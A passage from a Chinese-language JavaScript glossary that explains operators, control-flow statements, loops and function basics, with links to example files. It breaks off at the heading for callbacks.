`void expr` 会**求值** `expr` 但**丢弃结果**，并始终返回 `undefined`。关键细节：它保留副作用——`void sideEffect()` 会真的执行函数，只是把返回值扔掉。历史用途有两个：一是 `void 0` 在 `undefined` 可被重新赋值的旧年代（ES5 前）安全地取得 `undefined`；二是 `javascript:void(0)` 让链接不跳转。现代代码里它主要用于**显式表达"我故意不要这个返回值"**，以及让箭头函数返回 `undefined`（`onClick={() => void doThing()}`）。它也常被用来区分"表达式语句"的开头 —— 以 `void` 开头的语句不会被解析成代码块。也见 Unary operator。

示例：[`04_operators/11_void_operator.js`](04_operators/11_void_operator.js)

### typeof operator（typeof 运算符）

`typeof x` 返回一个表示类型的字符串，且**从不抛错**——对未声明的变量也安全地返回 `'undefined'`，这是它最大的价值。关键细节：有两个著名的历史遗留——`typeof null === 'object'`（早期实现的 bug 因兼容性被永久保留），以及 `typeof function(){} === 'function'`（函数虽属对象但被单独归类）。`typeof` 无法区分具体的对象类型（`typeof [] === 'object'`），要区分类别需用 `Array.isArray` 或 `instanceof`。常见误解是以为 `typeof` 能识别所有类型——`Symbol` 返回 `'symbol'`、`BigInt` 返回 `'bigint'`，但类实例永远只返回 `'object'`。也见 instanceof operator。

示例：[`04_operators/11_void_operator.js`](04_operators/11_void_operator.js)、[`03_data_types/02_typeof_operator.js`](03_data_types/02_typeof_operator.js)

### in operator（in 运算符）

`key in obj` 判断属性是否**存在于对象或其原型链上**，返回布尔值。关键细节：它检查的是"键"而不是"值"，数组上用它是检查**索引**是否有效（`1 in ['a','b']` 为 `true`），因此 `for...in` 遍历数组得到的是下标字符串。因为它会沿原型链查找，判断"自有属性"应改用 `Object.hasOwn(obj, key)` 或 `Object.prototype.hasOwnProperty.call`。常见误解是拿 `in` 检查数组是否包含某个**元素**（应使用 `includes`）。也见 for...in、instanceof operator。

示例：[`09_objects/11_object_has_own.js`](09_objects/11_object_has_own.js)、[`05_control_flow/06_for_in.js`](05_control_flow/06_for_in.js)

### instanceof operator（instanceof 运算符）

`obj instanceof Ctor` 检查 `Ctor.prototype` 是否出现在 `obj` 的**原型链**上，用于判断"这个对象是不是某个类（或函数）构造出来的"。关键细节：它比较的是原型链而非"构造者"标签，因此原型被改写后会失效，跨 `iframe` / 跨 `realm` 的对象也会判定失败（因为 `prototype` 对象不是同一个）。`Symbol.hasInstance` 可以自定义它的行为。常见误解是用它判断原始值——`1 instanceof Number` 是 `false`（原始值没有原型链）。也见 typeof operator、in operator。

示例：[`14_classes/09_instanceof_and_brands.js`](14_classes/09_instanceof_and_brands.js)

### delete operator（delete 运算符）

`delete obj.key` 从对象上**移除**属性，成功返回 `true`，失败返回 `false`。关键细节：它是唯一能真正删除属性的运算符，删除后 `'key' in obj` 变为 `false`，但 `obj.key` 读出的是 `undefined`（与"属性存在且值为 `undefined`"表现相似，需用 `in` 区分）。它对变量和函数声明**无效**（非严格模式静默返回 `false`，严格模式抛 `TypeError`），对数组元素会留下"空洞"而**不改变 `length`**（数组变稀疏）。常见误解是以为 `delete` 能释放内存——它只是断开引用，内存回收由 GC 决定。

示例：[`04_operators/11_void_operator.js`](04_operators/11_void_operator.js)、[`09_objects/02_property_access.js`](09_objects/02_property_access.js)

### Spread operator（展开运算符 ...）

`...` 出现在**可迭代对象或对象字面量**前时把内容"铺开"：`[...arr]`、`{...obj}`、`f(...args)`。关键细节：数组/函数实参位置的展开要求右侧是**可迭代对象**（数组、字符串、Map、Set、生成器都行），对象字面量的展开则只复制**自有可枚举属性**。它产出的是**浅拷贝**——`{...obj}` 不会深拷贝嵌套对象，内层引用仍被共享。常见误解是以为展开是"深克隆"或"无损拷贝"，实际上它只复制一层，且会丢失原型（`{...obj}` 的结果是普通对象）。

示例：[`04_operators/09_spread_rest.js`](04_operators/09_spread_rest.js)

### Rest parameters（剩余参数 ...）

`function f(...args)` 在**形参位置**使用 `...`，把多余的实参收集成一个真正的数组。关键细节：它与展开运算符符号相同但语义相反（一个是"散开"，一个是"收集"），判断依据是出现在形参/解构目标里还是实参/字面量里。剩余参数必须是**最后一个**形参，且函数有剩余参数后 `f.length` 不再包含它。它与 `arguments` 的关键差异是：`arguments` 是类数组、不是真数组。也见 Spread operator。

示例：[`04_operators/09_spread_rest.js`](04_operators/09_spread_rest.js)

### Operator precedence（运算符优先级）

优先级决定**相邻的两个运算符谁先与操作数结合**，例如 `1 + 2 * 3` 先算 `*`。关键细节：优先级表很长（19 级左右），但真正容易踩的只有几处——位运算 `&` / `|` 的优先级**低于**比较运算符（`a & b === 0` 实际是 `a & (b === 0)`，必须加括号）；`typeof` / `void` / `delete` 等一元运算符优先级极高；`??` 与 `||` / `&&` 裸混用直接语法报错。常见误解是背下整张表——更可靠的做法是"拿不准就加括号"，因为读代码的人（包括三个月后的你）也不会去查表。也见 Associativity。

示例：[`04_operators/10_operator_precedence.js`](04_operators/10_operator_precedence.js)

### Associativity（结合性）

当**优先级相同**的运算符相邻时，结合性决定结合方向：`-`、`+`、`*`、`%` 等是**左结合**（`a - b - c` 等于 `(a - b) - c`），而 `**`、赋值运算符、三元运算符是**右结合**（`a = b = c` 从右往左，`a ? b : c ? d : e` 等于 `a ? b : (c ? d : e)`）。关键细节：右结合正是嵌套三元能写成链式（`score >= 90 ? 'A' : score >= 60 ? 'B' : 'C'`）的原因。常见误解是以为结合性影响"执行顺序"——它只影响语法上的分组，实际求值顺序仍是严格从左到右。也见 Operator precedence。

示例：[`04_operators/10_operator_precedence.js`](04_operators/10_operator_precedence.js)

### Statement（语句）

语句是 JavaScript 的**执行单位**，程序就是语句的序列，用分号或换行分隔。关键细节：语句与表达式的核心区别在于"是否产生值"——表达式总能算出值，语句不能出现在需要值的位置（`let x = if (a) {}` 是非法的）。JS 里有一类特殊的"表达式语句"，允许把表达式孤立地当作语句用（`sideEffect();`）。常见误解是把两者混为一谈，导致在箭头函数里写了 `if` 语句当返回值——需要值的地方只能放表达式。也见 Block statement、Ternary operator。

示例：[`05_control_flow/01_if_else.js`](05_control_flow/01_if_else.js)

### Block statement（块语句 / 复合语句）

`{ ... }` 把多条语句打包成一条复合语句，同时**创建一个块级作用域**。关键细节：`let` / `const` / `class` / 函数声明在块内声明的变量不会泄漏到块外（`var` 会），这就是"块作用域"的实现方式。块本身**不需要** `if` / `for` 陪衬，可以独立书写（裸块在非严格模式下允许函数声明），但带标签的块可以用 `break label;` 提前跳出。常见误解是以为 `{}` 只是"视觉分组"——它有真实的作用域语义，也是 `if (a) let x = 1;` 会报错的原因（声明不能作为单语句体）。

示例：[`05_control_flow/01_if_else.js`](05_control_flow/01_if_else.js)

### Conditional statement（条件语句）

条件语句根据真值/假值选择执行路径，JavaScript 提供 `if...else` 与 `switch` 两种。关键细节：条件的判定走的是"真值/假值"规则而非严格的布尔转换，因此 `if (0)` 不进分支、`if ([])` 进分支。`else if` 其实不是独立关键字，只是 `else` 后面跟了一条新的 `if` 语句。常见误解是以为条件必须是布尔值——JS 允许任何值，这既是便利也是 bug 来源（如 `if (x = 1)` 恒真）。也见 Truthy and falsy、switch statement。

示例：[`05_control_flow/01_if_else.js`](05_control_flow/01_if_else.js)

### if / else if / else（if 条件链）

`if` 单独使用表示"条件成立就执行"；加 `else` 表示"否则执行另一支"；串联成 `else if` 则形成**互斥的多分支选择**，从上到下第一个成立的分支胜出，其余全部跳过。关键细节：链条中**条件的顺序是语义的一部分**——把宽泛条件写前面会让后面更具体的分支永远不执行，判断区间时应从窄到宽（先判 `>= 90` 再判 `>= 60`）。`else` 分支应当覆盖"剩下的全部情况"，即使它看起来不可能到达。常见误解是以为多个 `if` 与 `else if` 等价——多个独立 `if` 会全部求值，可能造成多次执行。也见 Dangling else、Guard clause。

示例：[`05_control_flow/01_if_else.js`](05_control_flow/01_if_else.js)

### Dangling else（悬挂 else）

当 `if` 没有写花括号且嵌套时，`else` 总是与**最近的那个未配对的 `if`** 结合，这与缩进所暗示的意图可能相反。关键细节：`if (a) if (b) x(); else y();` 里的 `else` 属于内层 `if (b)`，即 `y()` 只在"a 真且 b 假"时执行，而不是"a 假"时执行。解决办法只有一个：**永远写花括号**，这样分组就毫无歧义。常见误解是以为缩进会影响解析——JS 完全忽略缩进。也见 Block statement。

示例：[`05_control_flow/01_if_else.js`](05_control_flow/01_if_else.js)

### switch statement（switch 语句）

`switch (expr)` 把同一个表达式的值与多个 `case` 逐一比较，进入第一个匹配的分支。关键细节：匹配用的是**严格相等 `===`**，因此 `case '1'` 不会匹配数字 `1`，`case NaN` 永远不会匹配（`NaN !== NaN`）。求值顺序是自上而下，`default` 可以出现在任意位置（但通常放最后）。忘记 `break` 会**穿透**到下一个 case，这是一个高频 bug，也常被刻意利用来分组。常见误解是以为 `switch` 是"性能优化版的 if"——现代引擎里两者差距极小，选择依据应是可读性。也见 fallthrough、Strict equality。

示例：[`05_control_flow/02_switch.js`](05_control_flow/02_switch.js)

### case clause（case 子句）

`case 值:` 是 `switch` 中的一个标签，标记"若表达式的值严格等于它，就从这里开始执行"。关键细节：`case` 后面可以是任意**表达式**（不限于字面量），所以 `case 1 + 1:` 合法；但它在进入 `switch` 时就会被求值，不能用于依赖运行时状态的动态比较。匹配成功后**不会自动停止**，程序会一路往下执行直到遇到 `break`、`return` 或 `switch` 结束。常见误解是以为 `case` 是"独立的代码块"从而自带作用域——实际上所有 case 共享同一个块作用域，同一变量名重复 `let` 声明会报错。

示例：[`05_control_flow/02_switch.js`](05_control_flow/02_switch.js)

### fallthrough（switch 穿透）

`case` 匹配后若没有 `break` / `return`，控制流会**继续执行后续所有 case 的语句**，直到遇到出口。关键细节：这既是最常见的 bug（漏写 break 导致执行了不该执行的分支），也可以被刻意用作**分组**：多个 `case` 叠在一起后跟同一段代码，表示"这些值走同一处理逻辑"。规范上，只有 `case` 列表上方**没有语句**时的穿透才是"有意为之"的惯用法；带语句的穿透应写注释标明 `// falls through`。常见误解是把穿透当成语言缺陷——它是 C 语言继承来的设计，用好了能消除重复。也见 switch statement、break statement。

示例：[`05_control_flow/02_switch.js`](05_control_flow/02_switch.js)

### default clause（default 子句）

`default:` 在没有任何 `case` 匹配时执行，相当于 `switch` 的 `else`。关键细节：它**不必须**放在最后——若放在中间且前面有 case 穿透下来，它也会被执行；而且若 `default` 位于末尾且没有 `break`，函数会在 switch 结束后继续往下走（不构成穿透问题，但需注意后续代码）。它应覆盖所有"意料之外"的输入，比如抛出错误或记录日志。常见误解是以为 `default` 是"必须匹配成功的兜底"——它是可选的，没有匹配且没有 `default` 时 `switch` 什么也不做。

示例：[`05_control_flow/02_switch.js`](05_control_flow/02_switch.js)

### for loop（for 循环）

`for (初始化; 条件; 更新) { 循环体 }` 是最灵活的循环，三段都可省略。关键细节：执行顺序是"初始化 → 条件 → 循环体 → 更新 → 条件 → …"，即**条件判断次数比循环体多一次**，且更新表达式在循环体**之后**执行。用 `let` 声明循环变量时会**每轮创建新的绑定**，因此闭包里捕获的 `i` 各不相同（用 `var` 则会共享同一个变量，这是经典的闭包陷阱）。`for (;;)` 省略条件即为无限循环，必须靠内部 `break` 退出。也见 while loop、Infinite loop。

示例：[`05_control_flow/03_for_loop.js`](05_control_flow/03_for_loop.js)

### while loop（while 循环）

`while (条件) { 循环体 }` 在条件为真值时反复执行循环体，**先判断后执行**，所以条件一开始就为假时循环体一次都不执行。关键细节：`while` 不会自动推进任何变量，条件变量必须由循环体自己修改，否则就是死循环——这是 `while` 相比 `for` 更容易出错的地方。它适合"轮数未知、只知道终止条件"的场景（读取流直到结束、重试直到成功）。也见 do...while loop、Infinite loop。

示例：[`05_control_flow/04_while_loops.js`](05_control_flow/04_while_loops.js)

### do...while loop（do...while 循环）

`do { 循环体 } while (条件);` **先执行一次再判断**，因此循环体至少执行一次。关键细节：注意结尾的分号不能省略（它以语句形式结束）；循环体内声明的变量在 `while` 条件里可以用 `var` 访问但用 `let` 会在条件中抛 `ReferenceError`（因为 `let` 的作用域限于 `do` 的块）。它适合"必须先做一次，再决定要不要继续"的场景，比如用户输入校验、至少尝试一次的网络请求。常见误解是以为它和 `while` 只差一次执行——正是这一次执行让它在"至少需要一次"的语义下不可替代。也见 while loop。

示例：[`05_control_flow/04_while_loops.js`](05_control_flow/04_while_loops.js)

### for...of（for...of 循环）

`for (const x of iterable)` 遍历**可迭代对象**，每轮拿到的是**值本身**：数组得到元素，字符串得到字符（按码点），`Map` 得到 `[key, value]`，`Set` 得到成员。关键细节：它依赖**可迭代协议**（对象上有 `Symbol.iterator` 方法），因此普通对象 `{}` 不能被 `for...of` 遍历——需用 `Object.keys/values/entries` 先转换。它可以用 `break` / `continue` / `return` 中断，这是与数组方法（`forEach` 无法 `break`）的关键差异；`forEach` 遍历中 `await` 也不会等待，而 `for...of` 里 `await` 会逐轮等待。常见误解是与 `for...in` 混淆——后者遍历的是**键**。也见 for...in、Iterable protocol。

示例：[`05_control_flow/05_for_of.js`](05_control_flow/05_for_of.js)

### for...in（for...in 循环）

`for (const key in obj)` 遍历对象上**所有可枚举属性名**，包括**继承自原型链**的属性，且顺序不保证（数字键会被优先并按升序排列，其余按插入顺序）。关键细节：这正是它不该用来遍历数组的原因——除了会拿到原型上被扩展的方法名，`key` 还是**字符串**而非数字（`key + 1` 会变成拼接），并且它会跳过稀疏数组的空洞。`for...in` 的合理用途是"调试时枚举对象属性"或配合 `Object.hasOwn` 过滤后遍历字典。常见误解是把 `for...in` 当成"遍历值的循环"。也见 for...of、in operator。

示例：[`05_control_flow/06_for_in.js`](05_control_flow/06_for_in.js)

### Iterable protocol（可迭代协议）

一个对象只要实现了 `[Symbol.iterator]()` 方法、返回一个带 `next()` 的迭代器，它就是**可迭代对象**，于是 `for...of`、展开运算符 `...`、解构、`Array.from`、`Promise.all` 都能作用于它。关键细节：迭代器每次 `next()` 返回 `{ value, done }`，`done: true` 表示结束；`for...of` 正是不断调用 `next()` 直到 `done` 为真，同时会在提前 `break` 时调用迭代器的 `return()` 做清理。数组、字符串、`Map`、`Set`、生成器都可迭代，普通对象**不是**可迭代的。常见误解是以为"有 `length` 就能被遍历"——是否可迭代只取决于有没有 `Symbol.iterator`。

示例：[`05_control_flow/05_for_of.js`](05_control_flow/05_for_of.js)、[`17_iterators_and_generators/01_iterable_protocol.js`](17_iterators_and_generators/01_iterable_protocol.js)

### break statement（break 语句）

`break` **立即终止**当前循环或 `switch`，控制流跳到该结构之后继续执行。关键细节：它只跳出**最内层**的那个循环——嵌套循环里写 `break` 只会退出一层，若一次想退出多层，必须用带标签的 `break 标签名;`。在 `switch` 中 `break` 用于终止穿透。常见误解是以为 `break` 会终止整个函数——它只终止循环，函数会继续往下执行（要结束函数得用 `return`）。也见 continue statement、Labeled statement。

示例：[`05_control_flow/07_break_continue.js`](05_control_flow/07_break_continue.js)

### continue statement（continue 语句）

`continue` **跳过本轮剩余部分**，直接进入下一轮迭代（对 `for` 会先执行更新表达式，再判条件）。关键细节：这个"先执行更新"的行为在 `while` 中**不成立**——`while` 的更新通常写在循环体末尾，一旦 `continue` 跳过它，条件变量就不再推进，直接变成死循环。所以 `while` 里用 `continue` 必须把更新提到循环体开头，或改用 `for`。带标签的 `continue 标签名;` 可以跳到外层循环的下一轮。常见误解是把 `continue` 与 `break` 混用——一个跳过、一个终止。也见 break statement、Infinite loop。

示例：[`05_control_flow/07_break_continue.js`](05_control_flow/07_break_continue.js)

### Labeled statement（标签语句）

在语句前写 `标识符:` 就为它加了一个标签，之后可用 `break 标签;` 或 `continue 标签;` **指定**跳转目标。关键细节：标签最实用的场景是二维网格/矩阵查找——双层循环里内层 `break` 只退出一层，而 `break outer;` 能一次跳出两层；`continue outer;` 则能直接进入外层循环的下一轮。标签可以贴在任意语句前（包括块语句），但只有对循环和 `switch` 的 `break` / `continue` 才有实际意义；`continue` 的标签**必须**指向一个循环。常见误解是以为标签会创建作用域或像 `goto` 一样任意跳转——它只能向前跳出，不能跳入或反向跳。也见 break statement、continue statement。

示例：[`05_control_flow/07_break_continue.js`](05_control_flow/07_break_continue.js)

### Guard clause（卫语句）

卫语句是函数开头的**前置检查**：条件不满足就立刻 `return`（或 `throw`），把"异常情况"提前处理掉，避免整段主体被包在层层 `if` 里。关键细节：它把"深嵌套的否定条件"翻转成"平坦的肯定条件"，典型写法是参数校验、权限检查、快速路径返回三类。它的收益是**降低嵌套深度**——嵌套式写法常见三到四层缩进，卫语句写法通常能压到一层，人眼在同一屏内就能读完主干逻辑。常见误解是以为卫语句只是"提前 return 的风格偏好"——它实质改变了控制流的可读性结构。也见 Early return。

示例：[`05_control_flow/08_early_return.js`](05_control_flow/08_early_return.js)

### Early return（提前返回）

提前返回指在函数中途用 `return` 结束执行，而非一路走到末尾。关键细节：`return` 会**立刻结束整个函数**，所以循环中的 `return` 是跳出所有层循环的最干净手段（比标签 `break` 更直观）。但要注意两个陷阱：一是提前返回会**跳过后续的清理逻辑**（如关闭文件、释放锁、重置状态），除了在返回前逐个补齐，更好的做法是把清理放进 `finally` 块；二是同一个函数里不同分支返回的**值形状要一致**（不能一处返回对象、一处返回 `null`、一处返回 `false`），否则调用方无法稳定判断。也见 Guard clause。

示例：[`05_control_flow/08_early_return.js`](05_control_flow/08_early_return.js)

### Infinite loop（无限循环）

条件永远为真的循环，标准写法是 `while (true) { ... }` 或 `for (;;) { ... }`。关键细节：它**不是一个 bug 类别，而是一种惯用法**——事件循环、服务主循环、重试直到成功、"轮询并等待"都需要它，前提是循环体内一定存在 `break` / `return` / `throw` 这样的出口。真正危险的是**意外的**无限循环：忘记更新条件变量（`while (i < n)` 却不写 `i++`）、浮点累加永远达不到精确值、`while` 里的 `continue` 跳过了更新语句。调试这类问题时可以先加安全计数器（超过 N 次就强制 `break` 并打印）来定位。也见 while loop、break statement。

示例：[`05_control_flow/04_while_loops.js`](05_control_flow/04_while_loops.js)、[`05_control_flow/03_for_loop.js`](05_control_flow/03_for_loop.js)

### Loop invariant（循环不变式）

循环不变式是"在循环每一轮开始（和结束）时都成立"的性质断言，用来推理循环为什么正确——例如二分查找里"目标若存在，必在 `[left, right]` 闭区间内"，冒泡排序里"第 k 轮结束后末尾 k 个元素已就位"。关键细节：它有三段式用法——**初始化**（进入循环前成立）、**保持**（若某轮开始成立，则本轮结束仍成立）、**终止**（循环结束时，不变式加上终止条件就能推出结论）。它既是证明工具，也是写代码的指南：把不变式写成注释放在循环上方，往往能立刻发现边界写错了（如 `<=` 写成 `<`）。常见误解是把它当成可运行的断言——它一般只在人脑或形式化验证里维护，偶尔用 `console.assert` 辅助。也见 for loop、Infinite loop。

示例：[`05_control_flow/03_for_loop.js`](05_control_flow/03_for_loop.js)

---

## 函数与作用域闭包

本册覆盖 `06_functions` 与 `07_scope_and_closure` 两个目录，包括函数的各种定义形式、参数机制、高阶函数与函数式技巧，以及作用域、执行上下文与闭包的完整体系。

### Function（函数）

JavaScript 中可复用的代码块，也是一类**特殊的对象**——它可以被赋值给变量、作为参数传递、作为返回值返回，甚至还带属性（`name`、`length`）和方法（`call`/`apply`/`bind`）。函数是 JS 唯一能创建作用域的手段之一（另一个是块），因此它同时承担「复用逻辑」和「封装状态」两个职责。关键细节：函数体只有被调用时才执行，函数定义本身只是「创建了一个函数值」。常见误解是以为函数必须用 `function` 关键字定义——实际上箭头函数、类方法、生成器、`async` 函数都是函数的不同形态。

示例：[`06_functions/01_declaration_vs_expression.js`](06_functions/01_declaration_vs_expression.js)

### Function Declaration（函数声明）

形如 `function foo() {}` 的独立语句，以 `function` 关键字开头并且**必须有名字**。它是唯一会在「创建阶段」被整体提升的声明形式：引擎在执行任何一行代码之前，就把整个函数对象放进了当前作用域，所以可以在声明之前调用它。也见 Function Expression（函数表达式）、Hoisting（提升）。

示例：[`06_functions/01_declaration_vs_expression.js`](06_functions/01_declaration_vs_expression.js)

### Function Expression（函数表达式）

形如 `const foo = function () {}` 的写法：右侧是一个「产生函数值」的表达式，再赋值给变量、属性或参数。它不是语句，走的是普通变量的提升规则——`var` 只提升变量名（调用时是 `undefined`，报 TypeError），`let`/`const` 还有 TDZ。与函数声明最关键的区别是**能否在定义之前调用**，以及函数表达式可以出现在任何「需要值」的位置（对象属性、数组元素、IIFE、回调）。也见 Function Declaration（函数声明）、Hoisting（提升）。

示例：[`06_functions/01_declaration_vs_expression.js`](06_functions/01_declaration_vs_expression.js)

### Named Function Expression（具名函数表达式）

函数表达式但**带了名字**，例如 `const f = function factorial(n) { ... }`。这个名字只存在于函数体内部的作用域里，外部拿不到，因此特别适合递归——即使外层变量被重新赋值或删除，函数体里依然能用这个名字调用自己。另一个副产品是 `fn.name` 属性和调试堆栈里会显示这个名字，可读性远好于匿名函数。常见误解是以为这个名字会泄漏到外层作用域（它不会）。

示例：[`06_functions/01_declaration_vs_expression.js`](06_functions/01_declaration_vs_expression.js)

### Anonymous Function（匿名函数）

没有名字的函数值，典型来源是函数表达式省略名字（`const f = function () {}`）和箭头函数（`const f = () => {}`）。它的问题是调试信息差（堆栈里显示 `<anonymous>`）、无法在内部引用自身做递归。注意一个容易被忽略的细节：`const f = function () {}` 在现代引擎里会通过「名字推断」把 `fn.name` 设为 `'f'`，所以「匿名」更多是语法概念而非运行时概念。

示例：[`06_functions/13_function_properties.js`](06_functions/13_function_properties.js)

### Hoisting of Functions（函数提升）

函数声明会被完整提升（名字 + 函数体一起），函数表达式只会按变量规则提升，这是一切「能不能提前调用」问题的根因。一个常被考到的细节：在同一个作用域里后面再写同名函数声明，会覆盖前面的定义；而 `var` 变量提升的初始化值是 `undefined`，所以提前调用函数表达式会抛 `TypeError: f is not a function` 而不是 `ReferenceError`。也见 Hoisting（提升）。交叉参考 [`02_variables/04_hoisting_and_tdz.js`](02_variables/04_hoisting_and_tdz.js)。

示例：[`06_functions/01_declaration_vs_expression.js`](06_functions/01_declaration_vs_expression.js)

### Parameter（形参）

定义函数时写在括号里的占位变量名，例如 `function add(a, b)` 中的 `a`、`b`。形参是**函数作用域内的局部变量**，每次调用都会重新创建、互不干扰（这正是递归能正常工作的前提）。关键细节：`fn.length` 返回的是「第一个带默认值或 rest 参数之前的形参个数」，所以 `function f(a, b = 1) {}` 的 `length` 是 1。也见 Argument（实参）。

示例：[`06_functions/02_parameters.js`](06_functions/02_parameters.js)

### Argument（实参）

调用函数时真正传进去的值。JS 对实参与形参的个数**几乎不做检查**：传少了对应形参为 `undefined`（不是 `null`），传多了多出来的部分被静默忽略（但可通过 `arguments` 或 rest 参数拿到）。这种松散设计是「函数签名只是建议」的直接体现，也是默认参数、rest 参数存在的理由。也见 Parameter（形参）、`arguments` Object（arguments 对象）。

示例：[`06_functions/02_parameters.js`](06_functions/02_parameters.js)

### Default Parameter（默认参数）

ES6 语法，形如 `function f(a, b = 10)`，只在实参为 **`undefined`** 时才求值生效（传 `null` 不会触发）。默认值可以是任意表达式，并且求值时机很讲究：每次调用且该参数缺省时才求值一次，可以引用排在它**前面**的形参，不能引用后面的（会抛 ReferenceError），也不能访问函数体内的变量。这个特性常被用来做「必填参数校验」技巧：`function req() { throw new Error('missing') }` 然后写成 `function f(x = req())`。也见 Parameter（形参）。

示例：[`06_functions/14_default_parameters_tricks.js`](06_functions/14_default_parameters_tricks.js)

### Parameter Destructuring（参数解构）

在形参位置直接解构传入的对象或数组，例如 `function f({ name, age = 18 }) {}`。它把「取参数 → 判空 → 给默认值」三件事压缩成一个签名，可读性提升明显；对象解构支持默认值、重命名 `{ a: x }` 和剩余属性 `{ a, ...rest }`。最常见的坑是**解构 `undefined` 会抛错**，所以调用方什么都不传时需要写成 `function f({ a } = {}) {}` 兜底。也见 Default Parameter（默认参数）。交叉参考 [`10_destructuring/05_function_parameters.js`](10_destructuring/05_function_parameters.js)。

示例：[`06_functions/14_default_parameters_tricks.js`](06_functions/14_default_parameters_tricks.js)

### Rest Parameter（剩余参数）

写在形参表**最后**的 `...args`，把「剩下的所有实参」收集成一个**真正的数组**，例如 `function sum(...nums)`。它一举解决了 `arguments` 的三个硬伤：`args` 有 `map`/`filter`/`reduce`、可以只收集后半段（`function f(first, ...rest)`）、箭头函数里也能用。关键限制：一个函数只能有一个 rest 参数，且必须在最后，后面不能再有形参。也见 Spread Operator（展开运算符）、`arguments` Object（arguments 对象）。

示例：[`06_functions/03_rest_parameters.js`](06_functions/03_rest_parameters.js)

### Spread Operator（展开运算符）

同样是 `...` 三个点，但出现在**实参位置或数组/对象字面量里**时叫「展开」，作用是把可迭代对象或对象属性「摊开」：`f(...arr)`、`[...a, ...b]`、`{ ...obj }`。记忆方法是看方向——把多个值**收进**一个变量就是 rest（剩余），把一个容器**摊出去**就是 spread（展开），两者语法相同、语义相反。常见误解是把 `[...arr]` 当成深拷贝，实际上它只是浅拷贝（嵌套对象仍然共享引用）。

示例：[`06_functions/03_rest_parameters.js`](06_functions/03_rest_parameters.js)

### `arguments` Object（arguments 对象）

每个**普通函数**（非箭头函数）内部自动可用的类数组对象，装着本次调用的所有实参，例如 `function f() { return arguments[0] }`。它最大的特点是「不依赖形参声明」就能拿到全部实参，并带有一个已废弃的 `callee` 属性（严格模式下访问会报错）。硬伤有三：不是真数组（要 `Array.from` 才能用数组方法）、无法只取后半段、箭头函数里根本没有。现代代码里应优先使用 Rest Parameter（剩余参数）。也见 Array-like Object（类数组对象）。

示例：[`06_functions/02_parameters.js`](06_functions/02_parameters.js)

### Array-like Object（类数组对象）

有 `length` 属性、可以用下标访问，但**没有数组的方法**（因为没有 `Array.prototype`）的对象，典型的如 `arguments`、DOM 的 `NodeList`、字符串。判断一个值是否可用数组方法，看的是它的原型链，而不是「长得像不像数组」。转换方式有 `Array.from(x)`、`[...x]`（要求可迭代）和 `Array.prototype.slice.call(x)`（借用方法）。也见 `arguments` Object（arguments 对象）。

示例：[`06_functions/02_parameters.js`](06_functions/02_parameters.js)

### Arrow Function（箭头函数）

ES6 引入的简写函数形式 `(a, b) => a + b`。它不只是语法糖，而是**语义上也不一样的函数**：没有自己的 `this`（用外层的）、没有 `arguments`、没有 `prototype`、不能被 `new`、也不能作为生成器。因此它适合做回调和函数式写法，不适合做对象方法、构造函数或需要动态 `this` 的场景。也见 Lexical this（词法 this）、Concise Body vs Block Body（简写体 vs 块体）。

示例：[`06_functions/04_arrow_functions.js`](06_functions/04_arrow_functions.js)

### Lexical this（词法 this）

箭头函数不创建自己的 `this`，而是**从定义位置的外层作用域继承**这个 `this`，并且一旦确定就再也改不掉——`call`/`apply`/`bind` 都无法覆盖它。这条规则直接消灭了回调里 `this` 丢失的经典问题（`setTimeout`、`arr.map` 的回调），也让 `const self = this` / `.bind(this)` 这类旧写法变得不必要。关键提醒：正因为它「锁定外层」，箭头函数**不能**用作对象方法或需要动态 `this` 的地方。也见 Explicit Binding of this（this 的显式绑定）。交叉参考 [`15_this_and_context/03_this_in_arrow.js`](15_this_and_context/03_this_in_arrow.js)。

示例：[`06_functions/05_arrow_vs_regular.js`](06_functions/05_arrow_vs_regular.js)

### Concise Body vs Block Body（简写体 vs 块体）

箭头函数有两种函数体写法：**简写体** `x => x * 2`（一个表达式，自动作为返回值，不需要 `return`）和**块体** `x => { return x * 2 }`（花括号包起来的语句块，必须有显式 `return`）。最经典的坑就是这个：把简写体改写成块体时忘了加 `return`，函数就静默返回 `undefined`。另一个细节是简写体返回对象字面量必须用圆括号包住 `() => ({ a: 1 })`，否则花括号会被当成块体。

示例：[`06_functions/04_arrow_functions.js`](06_functions/04_arrow_functions.js)

### IIFE（立即调用函数表达式）

IIFE = **I**mmediately **I**nvoked **F**unction **E**xpression，即「定义完立刻执行」的函数，常见写法 `(function () { ... })()` 或 `(() => { ... })()`。两个要点：它必须是**表达式**（所以整体要用括号包裹，否则会被解析成函数声明而报错），以及定义后紧跟的 `()` 触发调用。之所以需要它，是因为 ES6 之前 JS 只有函数作用域，想造一个不污染全局的私有空间只能靠函数。它也常用来把循环变量「冻结」成每次迭代独立的一份。也见 Module Pattern（模块模式）。

示例：[`06_functions/06_iife.js`](06_functions/06_iife.js)

### Module Pattern（模块模式）

ES6 之前最流行的封装手法：用一个 IIFE 创建私有作用域，把状态藏在里面，只返回一组「特权方法」供外部读写。典型代码是 `const counter = (function () { let count = 0; return { inc() { count++ } } })()`——外部拿不到 `count`，只能通过 `inc` 操作它。它能成立的机制正是 Closure（闭包）：返回的方法「记住」了 IIFE 里的局部变量。现代代码里它的位置已被 ESM 模块和类私有字段 `#field` 取代，但模式思想仍在。也见 Closure（闭包）、IIFE（立即调用函数表达式）。交叉参考 [`30_design_patterns/01_module_pattern.js`](30_design_patterns/01_module_pattern.js)。

示例：[`07_scope_and_closure/07_closure_private_state.js`](07_scope_and_closure/07_closure_private_state.js)

### First-Class Citizen（一等公民）

指某个语言实体可以像普通值一样被使用：赋值给变量、作为参数传入、作为返回值返回、放进数组或对象、在运行时动态创建。JavaScript 里**函数是一等公民**，这是高阶函数、回调、闭包、柯里化等一切函数式技巧的前置条件。对比来看，Java 的方法（JDK 8 之前）就不是一等公民，必须包在对象里才能传递。也见 Higher-Order Function（高阶函数）。

示例：[`06_functions/08_higher_order_functions.js`](06_functions/08_higher_order_functions.js)

### Higher-Order Function（高阶函数）

HOF = **H**igher-**O**rder **F**unction，即满足下面任意一条的函数：接收一个或多个函数作为参数，或者返回一个函数作为结果。它是「把行为参数化」的手段——排序算法不必为每种比较规则写一遍，只要把「怎么比较」作为函数传进去即可。满足第一条的参数函数通常叫回调，满足第二条的返回值常用于做「函数的工厂」。`map`、`filter`、`reduce`、`setTimeout` 都是内置高阶函数。也见 Callback（回调函数）、First-Class Citizen（一等公民）。

示例：[`06_functions/08_higher_order_functions.js`](06_functions/08_higher_order_functions.js)

### Callback（回调函数）

